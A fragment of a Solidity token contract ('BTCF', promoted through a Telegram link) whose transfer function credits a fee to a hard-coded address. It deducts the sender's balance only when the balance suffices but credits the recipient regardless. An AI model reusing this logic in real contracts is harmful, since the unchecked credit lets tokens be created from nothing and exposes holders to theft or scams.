...
// Submitted for Telegram: https://t.me/bitcoinfloki
...
contract  BTCF  is Ownable, IERC20 {
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c, _bruntoken);
        }
